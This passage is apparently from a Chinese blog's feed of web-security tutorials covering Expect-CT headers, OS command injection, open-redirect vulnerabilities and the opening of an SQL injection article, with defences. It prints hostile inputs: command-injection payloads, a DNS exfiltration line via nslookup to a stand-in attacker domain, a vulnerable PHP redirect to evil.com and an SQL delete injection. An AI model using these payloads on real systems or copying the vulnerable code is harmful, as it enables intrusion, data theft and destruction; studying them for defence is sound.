srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><code>HTTPS</code> 证书最大的问题就是伪造证书的存在，一旦出现伪造证书，安全体系将会非常脆弱，出现伪造证书的原因如下：</p><ul><li><code>CA</code> 机构有意无意会签发一些错误的证书，比如 <code>CA</code> 机构没有正确校验申请者的身份。</li><li><code>CA</code> 机构是一个追求盈利的机构，在利益的驱动下，可能会无节制的签发证书，如果签发一个恶意的二级 <code>CA</code> 证书，带来的危害更大。</li><li>攻击者会通过各种技术攻击手段，冒充或者伪造某个域名的拥有者，从而成功申请到一张证书，然后通过证书进行危害操作。</li></ul><p>这时，证书的使用者可能会存在下面的困惑：</p><ul><li>域名拥有者无法知晓那些 <code>CA</code> 机构给他签发了证书，也不知道是否有人冒充他的身份申请证书并提供服务。</li><li><code>CA</code> 机构并不清楚它到底签发了多少证书，也不确定是否签发了伪造证书，二级 <code>CA</code> 签发机制不可控。</li><li>对于浏览器来说，它没有技术手段校验证书是否是合法的。</li></ul><p><a name="eixvS"></a></p><h2 id="证书透明度"><a href="#证书透明度" class="headerlink" title="证书透明度"></a>证书透明度</h2><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1597217648034-f3d16d20-05e7-4955-9131-1170e25d3917.png#height=770&id=bZaHv&originHeight=770&originWidth=1080&originalType=binary&ratio=1&rotation=0&showTitle=false&size=121310&status=done&style=none&title=&width=1080" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1597217648034-f3d16d20-05e7-4955-9131-1170e25d3917.png#height=770&id=bZaHv&originHeight=770&originWidth=1080&originalType=binary&ratio=1&rotation=0&showTitle=false&size=121310&status=done&style=none&title=&width=1080" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>为了解决证书潜在的问题，谷歌提出了一个解决方案，这就是证书透明度（CT）。CT 是一组技术解决方案，它能够审计、监控证书的签发、使用，从而让更透明，它不是证书的替代解决方案，而是证书的有效补充。通过 CT，能够达成以下的几个目标：</p><ul><li><code>CA</code> 机构能够知晓其签发了那些证书，并快速检测到是否签发恶意证书了。</li><li>网站拥有者能够知晓域名对应证书签发的全过程，一旦发现有攻击者伪造了域名对应的证书，可以快速联系 <code>CA</code> 机构，吊销该证书。</li><li>浏览器厂商能够审计证书的使用情况，如果发现有恶意证书，可以快速关闭 HTTPS 连接，保障用户的安全。</li></ul><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1597217664356-53095465-1bc9-4f6d-899c-559c3008dd5b.png#height=328&id=y4I3b&originHeight=328&originWidth=684&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31723&status=done&style=none&title=&width=684" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1597217664356-53095465-1bc9-4f6d-899c-559c3008dd5b.png#height=328&id=y4I3b&originHeight=328&originWidth=684&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31723&status=done&style=none&title=&width=684" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="Expect-CT"></a></p><h2 id="Expect-CT"><a href="#Expect-CT" class="headerlink" title="Expect-CT"></a>Expect-CT</h2><p>为了确保浏览器能在访问到缺少  <code>CT</code>  监督的证书（例如 CA 意外发出的证书）时采取措施，<code>Google</code>  提案增加了一个新的  <code>Expect-CT HTTP Header</code>，该  <code>HTTP Header</code>  用来告诉浏览器期望证使用书透明度服务。<code>Expect-CT</code>  <code>CT</code>  头部允许站点选择报告或强制执行证书透明度要求，这可以防止站点证书错误被忽视的情况。当站点启用  <code>Expect-CT CT Header</code>  时，浏览器会检查该站点使用的证书是否出现在公共 CT 日志中，这能有效的避免中间人攻击等  <code>HTTPS</code>  威胁，让站点更加安全。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1597217687228-d300ce5b-8e56-41b6-bea6-a13ad20fdf64.png#height=718&id=FAyIk&originHeight=718&originWidth=1080&originalType=binary&ratio=1&rotation=0&showTitle=false&size=197013&status=done&style=none&title=&width=1080" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1597217687228-d300ce5b-8e56-41b6-bea6-a13ad20fdf64.png#height=718&id=FAyIk&originHeight=718&originWidth=1080&originalType=binary&ratio=1&rotation=0&showTitle=false&size=197013&status=done&style=none&title=&width=1080" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Expect-CT: report-uri=&quot;&lt;uri&gt;&quot;, enforce,max-age=&lt;age&gt;</span><br></pre></td></tr></table></figure><p>在部署的时候有两种策略可供选择，一种是仅报告，一种是强制执行。在仅报告策略中，浏览器在没有收到有效的 CT 信息情况下，会向<code>report-uri</code>设置的地址发送报告。对于该策略，你可以如下设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Expect-CT: max-age=0, report-uri=&quot;https://&#123;$subdomain&#125;.report-uri.com/r/d/ct/reportOnly&quot;</span><br></pre></td></tr></table></figure><p>该策略下，如果浏览器未收到有效的 CT 信息，不会终止连接，只会向你指定的 URI 发送报告。而第二种策略可如下设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Expect-CT: enforce, max-age=30, report-uri=&quot;https://&#123;$subdomain&#125;.report-uri.com/r/d/ct/enforce&quot;</span><br></pre></td></tr></table></figure><p>这也就是告诉浏览器强制执行  <code>CT</code>  策略并且缓存该状态  <code>30s</code> 。如果浏览器没有收到有效的  <code>CT</code>  信息，将会终止链接同时也会发送报告。在正确的配置好  <code>CT</code>  信息后，你可以将该时间设置的更长。</p><blockquote><p>以下文章来源于 code 秘密花园  ，作者 ConardLi</p></blockquote><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OS命令注入</title>
      <link href="/2023/06/29/frontend/security/os-ming-ling-zhu-ru/"/>
      <url>/2023/06/29/frontend/security/os-ming-ling-zhu-ru/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="TCl7Y"></a></p><h2 id="什么是操作系统命令注入？"><a href="#什么是操作系统命令注入？" class="headerlink" title="什么是操作系统命令注入？"></a>什么是操作系统命令注入？</h2><p>OS 命令注入（也称为 shell 注入）是一种 Web 安全漏洞，<strong>允许攻击者在运行应用程序的服务器上执行任意操作系统 (OS) 命令</strong>，并且通常会完全破坏应用程序及其所有数据。通常，攻击者可以利用操作系统命令注入漏洞来破坏托管基础架构的其他部分，利用信任关系将攻击转向组织内的其他系统。</p><p><a name="XYwqu"></a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>简单来说就是因为 SQL 是一种结构化字符串语言，攻击者利用可以随意构造语句的漏洞构造了开发者意料之外的语句。<br />OS 注入攻击是指程序提供了直接执行 Shell 命令的函数的场景，当攻击者不合理使用，且开发者对用户参数未考虑安全因素的话，就会执行恶意的命令调用，被攻击者利用。</p><p><a name="nTJ2N"></a></p><h2 id="执行任意命令"><a href="#执行任意命令" class="headerlink" title="执行任意命令"></a>执行任意命令</h2><p>考虑一个购物应用程序，它允许用户查看特定商店中某件商品是否有货。此信息可通过以下 URL 访问：<br /><code>https:_//insecure-website.com/stockStatus?productID=381&amp;storeID=29_ </code></p><p>为了提供股票信息，应用程序必须查询各种遗留系统。由于历史原因，该功能是通过调用带有产品和存储 ID 作为参数的 shell 命令来实现的：<br /><code>stockreport.pl 381 29 </code><br />此命令输出指定项目的库存状态，并返回给用户。</p><p>由于应用程序没有针对操作系统命令注入实施防御，攻击者可以提交以下输入来执行任意命令：<br /><code>&amp; echo aiwefwlguh &amp; </code><br />如果在 productID 参数中提交了这个输入，那么应用程序执行的命令是：<br /><code>stockreport.pl &amp; echo aiwefwlguh &amp; 29 </code><br />该 echo 命令只是使提供的字符串在输出中回显，并且是测试某些类型的操作系统命令注入的有用方法。<strong>该&amp;字符是一个 shell 命令分隔符</strong>，因此执行的实际上是三个单独的命令一个接一个。结果，返回给用户的输出是：<br /><code>Error - productID was not provided </code><br /><code>aiwefwlguh </code><br /><code>29: command not found </code></p><p>三行输出表明：</p><ul><li>原始 stockreport.pl 命令在没有预期参数的情况下执行，因此返回了一条错误消息。</li><li>echo 执行 注入的命令，并在输出中回显提供的字符串。</li><li>原始参数 29 作为命令执行，导致错误。</li></ul><p>&amp;在注入的命令之后 放置额外的命令分隔符通常很有用，因为它将注入的命令与注入点之后的任何内容分开。这降低了以下内容阻止执行注入的命令的可能性。<br /><code>command1 &amp; command2 </code>：两个命令都执行<br /><code>command1 &amp;&amp; command2 </code>：与执行，第一个成功执行第二个才会执行<br /><code>command1 | command2</code> ：或执行，只执行第二个 command1 ||<br /><code>command2</code>：第一个执行成功，第二个不执行。第一个执行失败，第二个执行</p><p><a name="vtIsx"></a></p><h2 id="有用的命令"><a href="#有用的命令" class="headerlink" title="有用的命令"></a>有用的命令</h2><p>当您发现操作系统命令注入漏洞时，执行一些初始命令以获取有关您已入侵的系统的信息通常很有用。下面总结了一些在 Linux 和 Windows 平台上有用的命令：</p><table><thead><tr><th>命令的目的</th><th>Linux</th><th>Windows</th></tr></thead><tbody><tr><td>当前用户名</td><td>whoami</td><td>whoami</td></tr><tr><td>操作系统</td><td>uname -a</td><td>ver</td></tr><tr><td>网络配置</td><td>ifconfig</td><td>ipconfig &#x2F;all</td></tr><tr><td>网络连接</td><td>netstat -an</td><td>netstat -an</td></tr><tr><td>运行进程</td><td>ps -ef</td><td>tasklist</td></tr></tbody></table><p><a name="sc3AS"></a></p><h2 id="盲操作系统命令注入漏洞"><a href="#盲操作系统命令注入漏洞" class="headerlink" title="盲操作系统命令注入漏洞"></a>盲操作系统命令注入漏洞</h2><p>操作系统命令注入的许多实例都是<strong>盲漏洞</strong>。这意味着应用程序不会在其 HTTP 响应中返回命令的输出。仍然可以利用盲点漏洞，但需要不同的技术。<br />考虑一个允许用户提交有关该站点的反馈的网站。用户输入他们的电子邮件地址和反馈消息。然后，服务器端应用程序生成一封包含反馈的电子邮件给站点管理员。为此，它 mail 使用提交的详细信息调用程序。例如：<br /><code>mail -s &quot;This site is great&quot; -aFrom:peter@normal-user.net feedback@vulnerable-website.com</code> <br />mail 命令 的输出（如果有）<strong>不会在应用程序的响应中返回</strong>，因此使用 echo 有效负载将无效。在这种情况下，您可以使用各种其他技术来检测和利用漏洞。</p><p><a name="sPdhC"></a></p><h2 id="使用时间延迟检测盲操作系统命令注入"><a href="#使用时间延迟检测盲操作系统命令注入" class="headerlink" title="使用时间延迟检测盲操作系统命令注入"></a>使用时间延迟检测盲操作系统命令注入</h2><p>您可以使用将触发时间延迟的注入命令，允许您根据应用程序响应所需的时间来确认命令已执行。该 ping 命令是执行此操作的有效方法，因为它允许您指定要发送的 ICMP 数据包的数量，以及运行该命令所需的时间：<br /><code>&amp; ping -c 10 127.0.0.1 &amp; </code><br />此命令将导致应用程序 ping 10 秒</p><p><a name="t08I0"></a></p><h2 id="通过重定向输出来利用盲操作系统命令注入"><a href="#通过重定向输出来利用盲操作系统命令注入" class="headerlink" title="通过重定向输出来利用盲操作系统命令注入"></a>通过重定向输出来利用盲操作系统命令注入</h2><p>您可以将注入命令的输出重定向到 Web 根目录中的文件中，然后您可以使用浏览器检索该文件。例如，如果应用程序从文件系统位置提供静态资源&#x2F;var&#x2F;www&#x2F;static，那么您可以提交以下输入：<br /><code>&amp; whoami &gt; /var/www/static/whoami.txt &amp; </code><br />该&gt;字符将 whoami 命令的输出发送到指定的文件。然后，您可以使用浏览器获取<a href="https://vulnerable-website.com/whoami.txt%E6%96%87%E4%BB%B6%E4%BB%A5%E6%A3%80%E7%B4%A2%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B9%B6%E6%9F%A5%E7%9C%8B%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E7%9A%84%E8%BE%93%E5%87%BA%E3%80%82">https://vulnerable-website.com/whoami.txt文件以检索文件，并查看注入命令的输出。</a></p><p><a name="UhXDH"></a></p><h2 id="使用带外-OAST-技术利用-OS-命令盲注入"><a href="#使用带外-OAST-技术利用-OS-命令盲注入" class="headerlink" title="使用带外 ( OAST ) 技术利用 OS 命令盲注入"></a>使用带外 ( OAST ) 技术利用 OS 命令盲注入</h2><p>您可以使用注入的命令，使用 OAST 技术触发与您控制的系统的带外网络交互。例如：<br /><code>&amp; nslookup kgji2ohoyw.web-attacker.com &amp; </code><br />此有效负载使用该 nslookup 命令对指定域进行 DNS 查找。攻击者可以监视指定的查找发生，从而检测到命令已成功注入。<br />带外通道还提供了一种从注入的命令中提取输出的简单方法：<br /><code>&amp; nslookup </code>whoami<code>.kgji2ohoyw.web-attacker.com &amp; </code><br />这将导致对包含 whoami 命令结果的攻击者域进行 DNS 查找：<br /><code>wwwuser.kgji2ohoyw.web-attacker.com </code></p><p><a name="WsLxH"></a></p><h2 id="注入操作系统命令的方式"><a href="#注入操作系统命令的方式" class="headerlink" title="注入操作系统命令的方式"></a>注入操作系统命令的方式</h2><p>多种 shell 元字符可用于执行操作系统命令注入攻击。<br />许多字符用作命令分隔符，允许将命令链接在一起。以下命令分隔符适用于基于 Windows 和 Unix 的系统：</p><ul><li>&amp;</li><li>&amp;&amp;</li><li>|</li><li>||</li></ul><p>以下命令分隔符仅适用于基于 Unix 的系统：</p><ul><li>;</li></ul><p>换行符（0x0a 或\n）<br />在基于 Unix 的系统上，您还可以使用反引号或美元字符在原始命令中执行注入命令的内联执行：<br /><code>注入命令</code> <br />$( 注入命令 ) <br />请注意，不同的 shell 元字符具有细微的不同行为，这些行为可能会影响它们是否在某些情况下工作，以及它们是否允许带内检索命令输出或仅对盲目利用有用。<br />有时，您控制的输入会出现在原始命令的引号内。在这种情况下，您需要在使用合适的 shell 元字符注入新命令之前终止<strong>引用的上下文（使用”或’）。</strong><br><a name="hoKto"></a></p><h2 id="如何防止操作系统命令注入攻击"><a href="#如何防止操作系统命令注入攻击" class="headerlink" title="如何防止操作系统命令注入攻击"></a>如何防止操作系统命令注入攻击</h2><p>迄今为止，以防止操作系统命令注入漏洞的最有效的方法是从未调出从应用层代码 OS 命令。在几乎所有情况下，存在使用安全平台 API 实现所需功能的替代方式。<br />如果认为使用用户提供的输入调用操作系统命令不可避免，则必须执行强输入验证。有效验证的一些例子包括：</p><ul><li>验证针对允许值的白名单。</li><li>验证输入是否为数字。</li><li>验证输入仅包含字母数字字符，没有其他语法或空格。</li></ul><p>永远不要试图通过转义 shell 元字符来清理输入。实际上，这太容易出错并且容易被熟练的攻击者绕过。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URL跳转漏洞</title>
      <link href="/2023/06/29/frontend/security/url-tiao-zhuan-lou-dong/"/>
      <url>/2023/06/29/frontend/security/url-tiao-zhuan-lou-dong/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>定义：借助未验证的 URL 跳转，将应用程序引导到不安全的第三方区域，从而导致的安全问题。</p><p><a name="i8RfN"></a></p><h2 id="1-URL-跳转漏洞原理"><a href="#1-URL-跳转漏洞原理" class="headerlink" title="1.URL 跳转漏洞原理"></a>1.URL 跳转漏洞原理</h2><p><br />黑客利用 URL 跳转漏洞来诱导安全意识低的用户点击，导致用户信息泄露或者资金的流失。其原理是黑客构建恶意链接(链接需要进行伪装,尽可能迷惑),发在 QQ 群或者是浏览量多的贴吧&#x2F;论坛中。 安全意识低的用户点击后,经过服务器或者浏览器解析后，跳到恶意的网站中。 <br />恶意链接需要进行伪装,经常的做法是熟悉的链接后面加上一个恶意的网址，这样才迷惑用户。 <br />诸如伪装成像如下的网址，你是否能够识别出来是恶意网址呢？<br /><a href="http://gate.baidu.com/index?act=go&url=http://t.cn/RVTatrd">http://gate.baidu.com/index?act=go&amp;url=http://t.cn/RVTatrd</a> <a href="http://qt.qq.com/safecheck.html?flag=1&url=http://t.cn/RVTatrd">http://qt.qq.com/safecheck.html?flag=1&amp;url=http://t.cn/RVTatrd</a> <a href="http://tieba.baidu.com/f/user/passport?jumpUrl=http://t.cn/RVTatrd">http://tieba.baidu.com/f/user/passport?jumpUrl=http://t.cn/RVTatrd</a> <br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/355497/1646902247404-19b2acfc-69ed-4c1e-b698-f11104423c84.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/355497/1646902247404-19b2acfc-69ed-4c1e-b698-f11104423c84.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/355497/1646902255013-9510b295-e313-4d70-bc9e-c60ca47a4f47.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/355497/1646902255013-9510b295-e313-4d70-bc9e-c60ca47a4f47.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="ttIL5"></a></p><h2 id="2-实现方式"><a href="#2-实现方式" class="headerlink" title="2.实现方式"></a>2.实现方式</h2><p><br />●Header 头跳转<br />●Javascript 跳转<br />●META 标签跳转<br />这里我们举个 Header 头跳转实现方式：<br /><?php $url=$_GET['jumpto']; header("Location: $url"); ?></p><p><a href="http://www.wooyun.org/login.php?jumpto=http://www.evil.com">http://www.wooyun.org/login.php?jumpto=http://www.evil.com</a> <br />这里用户会认为<a href="http://www.wooyun.org都是可信的,但是点击上述链接将导致用户最终访问www.evil.com这个恶意网址./">www.wooyun.org都是可信的，但是点击上述链接将导致用户最终访问www.evil.com这个恶意网址。</a><br><a name="HK6o7"></a></p><h2 id="3-如何防御"><a href="#3-如何防御" class="headerlink" title="3.如何防御"></a>3.如何防御</h2><p><br /><strong>1)referer 的限制</strong><br />如果确定传递 URL 参数进入的来源，我们可以通过该方式实现安全限制，保证该 URL 的有效性，避免恶意用户自己生成跳转链接</p><p><strong>2)加入有效性验证 Token</strong><br />我们保证所有生成的链接都是来自于我们可信域的，通过在生成的链接里加入用户不可控的 Token 对生成的链接进行校验，可以避免用户生成自己的恶意链接从而被利用，但是如果功能本身要求比较开放，可能导致有一定的限制。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入攻击</title>
      <link href="/2023/06/29/frontend/security/sql-zhu-ru-gong-ji/"/>
      <url>/2023/06/29/frontend/security/sql-zhu-ru-gong-ji/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="5b3b2e1e"></a></p><h2 id="SQL-注入攻击"><a href="#SQL-注入攻击" class="headerlink" title="SQL 注入攻击"></a>SQL 注入攻击</h2><p><a name="e05dce83"></a></p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>SQL 注入攻击是黑客对数据库进行攻击的常用手段之一，不论是在 WEB 领域还是其它领域。攻击发生的原因依然是信任问题，开发人员信任用户输入，未对用户输入进行合法性检查，使应用程序存在安全隐患。譬如最常见的搜索功能，用户输入一段信息至后台进行数据库查询，当用户输入的信息中含有 SQL 语句时而后台未做安全检查时，该语句可能会被直接执行，这就是 SQL Injection。</p><p>SQL 注入攻击是从正常的 WWW 端口访问，而且表面看起来与一般的 Web 页面访问没什么区别，所以市面的防火墙都不会对 SQL 注入发出警报，如果管理员没查看日志的习惯，可能被入侵很长时间都不会发觉。但是，SQL 注入的手法相当灵活，在注入的时候会碰到很多意外的情况，需要构造巧妙的 SQL 语句，从而成功获取想要的数据或者操作。</p><p>注入攻击的本质，是把用户输入的数据当做代码执行。这里有两个关键条件，第一个是用户能够控制输入；第二个是原本程序要执行的代码，拼接了用户输入的数据。</p><p>从根本上来说，解决 SQL 注入攻击的方法依然是不要信任用户的任何数据输入。</p><p><a name="69dc9919"></a></p><h3 id="攻击例子"><a href="#攻击例子" class="headerlink" title="攻击例子"></a>攻击例子</h3><p>下面一个通过 id 搜索学生数据页面:<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913319491-8cd737e2-2cfd-45cc-8c6e-e3c33d05544b.png#height=153&id=GGGfs&originHeight=153&originWidth=432&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5035&status=done&style=none&title=&width=432" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913319491-8cd737e2-2cfd-45cc-8c6e-e3c33d05544b.png#height=153&id=GGGfs&originHeight=153&originWidth=432&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5035&status=done&style=none&title=&width=432" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="1.png"></p><p>该数据库中所拥有的数据:<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913324595-f723dc13-e892-4634-89af-1cd9cff56248.png#height=197&id=pCOxd&originHeight=197&originWidth=698&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9358&status=done&style=none&title=&width=698" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913324595-f723dc13-e892-4634-89af-1cd9cff56248.png#height=197&id=pCOxd&originHeight=197&originWidth=698&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9358&status=done&style=none&title=&width=698" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="2.png"></p><p>当点击搜索按钮时，页面往服务器发送请求，服务器根据 id 字段进行搜索并返回结果：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//localhost:3000/getStudentById?id=1</span></span><br><span class="line"></span><br><span class="line">请求: <span class="attr">http</span>: 结果: [&#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&quot;小明&quot;</span>, <span class="attr">sex</span>: <span class="string">&quot;男&quot;</span> &#125;];</span><br></pre></td></tr></table></figure><p>从上述的请求中可以攻击者猜测：服务器根据 id 进行数据库的查询操作，极有可能表明查询的表中含有 id 字段。随后攻击者猜测表名，在输入框中插入了一条删除数据的 SQL：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">delete</span> <span class="keyword">from</span> <span class="title class_">Student</span> where id = <span class="number">2</span></span><br></pre></td></tr></table></figure><p>执行结果：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913333179-6bfbbd06-9e61-467f-bcbe-97145867d67c.png#height=308&id=UKtUd&originHeight=308&originWidth=415&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14887&status=done&style=none&title=&width=415" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913333179-6bfbbd06-9e61-467f-bcbe-97145867d67c.png#height=308&id=UKtUd&originHeight=308&originWidth=415&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14887&status=done&style=none&title=&width=415" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="3.png"></p><p>此时查看数据库：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913339678-6b85f57a-2353-4734-8ed7-002c693959e6.png#height=141&id=JJbL6&originHeight=141&originWidth=686&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8520&status=done&style=none&title=&width=686" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913339678-6b85f57a-2353-4734-8ed7-002c693959e6.png#height=141&id=JJbL6&originHeight=141&originWidth=686&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8520&status=done&style=none&title=&width=686" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="4.png"></p><p>可以发现<code>id=2</code>的学生信息已经被删除。</p><p>查看后台的编写代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> mysql = <span class="built_in">require</span>(<span class="string">&quot;mysql&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="comment">//创建 connection</span></span><br><span class="line"><span class="keyword">const</span> connection = mysql.<span class="title function_">createConnection</span>(&#123;</span><br><span class="line">  <span class="attr">host</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">  <span class="attr">user</span>: <span class="string">&quot;root&quot;</span>,</span><br><span class="line">  <span 